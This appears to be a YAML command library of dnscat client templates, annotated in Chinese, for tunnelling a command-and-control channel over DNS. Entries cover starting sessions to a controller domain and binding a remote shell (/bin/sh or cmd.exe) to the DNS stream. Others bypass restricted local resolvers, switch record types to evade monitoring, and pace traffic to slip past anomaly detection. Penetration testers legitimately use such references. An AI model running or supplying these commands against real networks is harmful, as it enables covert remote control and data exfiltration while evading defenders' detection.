tool: dnscat
tags: [network, dns, exfiltration, c2, security, pentest, tunnel]

actions:
# === BASIC CONNECTIVITY ===
 - title: dnscat - 基本命令会话
   desc: |
     通过 DNS 与 dnscat 服务器建立默认的交互式命令会话。
     此模式是通过 DNS 查询启动 C2（命令与控制）通道的最常见方式，使用系统默认 DNS 设置解析指定域名并与监听器通信。
   command: "dnscat --dns domain={{domain}}"

 - title: dnscat - 连通性 ping
   desc: |
     执行简单的连通性检查，验证 dnscat 服务器是否在目标域名上监听。
     在尝试完整会话之前，用此排查连接问题或验证环境的 DNS 出口，若服务器响应，说明 DNS 流量已成功到达控制器。
   command: "dnscat --dns domain={{domain}} --ping"

# === SHELLS AND EXECUTION ===
 - title: dnscat - 执行进程（绑定 Shell）
   desc: |
     在客户端执行特定进程，并将其输入/输出链接到 DNS 流。
     常用于向 dnscat 服务器提供远程 Shell（如 /bin/sh 或 cmd.exe），请注意这会将客户端命令行暴露给服务器管理员。
   command: "dnscat --dns domain={{domain}} --exec {{process|/bin/sh}}"

 - title: dnscat - 交互式控制台模式
   desc: |
     启动一个输入和输出直接发送到本地控制台的会话。
     此模式适合手动数据传输或客户端与服务器操作员之间的直接通信，它绕过默认的命令会话逻辑以提供原始数据流。
   command: "dnscat --dns domain={{domain}} --console"

# === SECURITY AND AUTHENTICATION ===
 - title: dnscat - 使用密钥的认证会话
   desc: |
     设置共享密钥以启用加密并防止中间人（MITM）攻击。
     客户端和服务器必须配置相同的密钥连接才能成功，生产或敏感任务中强烈建议使用以确保会话完整性。
   command: "dnscat --dns domain={{domain}} --secret {{secret_key}}"

 - title: dnscat - 禁用加密
   desc: |
     显式禁用 DNS 会话的所有加密和认证。
     仅在调试或加密开销导致严重性能问题的环境中使用，请注意所有传输数据将以明文形式对监控 DNS 流量的任何人可见。
   command: "dnscat --dns domain={{domain}} --no-encryption"

# === NETWORK TUNING ===
 - title: dnscat - 自定义上游 DNS 服务器
   desc: |
     强制客户端将 DNS 查询发送到特定的上游服务器，而非系统默认。
     当你需要绕过受限的本地 DNS 解析器或指向特定内部域名服务器时非常有用，server 参数指定用于隧道的 DNS 解析器 IP 地址。
   command: "dnscat --dns domain={{domain}},server={{dns_server|8.8.8.8}}"

 - title: dnscat - 指定 DNS 记录类型
   desc: |
     将隧道限制为使用 TXT、MX 或 CNAME 等特定 DNS 记录类型。
     不同环境可能监控或阻止某些记录类型，切换可帮助规避检测，可提供单一类型或逗号分隔的偏好类型列表。
   command: "dnscat --dns domain={{domain}},type={{record_types|TXT,CNAME,MX}}"

 - title: dnscat - 隐蔽与节奏控制
   desc: |
     调整数据包之间的延迟并强制稳定的传输速率以避免检测。
     增大延迟可帮助绕过简单的速率限制或异常检测系统，steady 标志确保客户端即使立即收到响应也会等待完整的延迟周期。
   command: "dnscat --dns domain={{domain}} --delay {{delay_ms|2000}} --steady"

# === DEBUGGING ===
 - title: dnscat - 数据包跟踪调试
   desc: |
     启用详细的数据包跟踪，显示每个传入和传出的 dnscat 数据包。
     对于调试复杂网络路径或理解中间防火墙如何处理该协议至关重要，可提供通过 DNS 协议发送的十六进制编码数据的细粒度视图。
   command: "dnscat --dns domain={{domain}} --packet-trace"
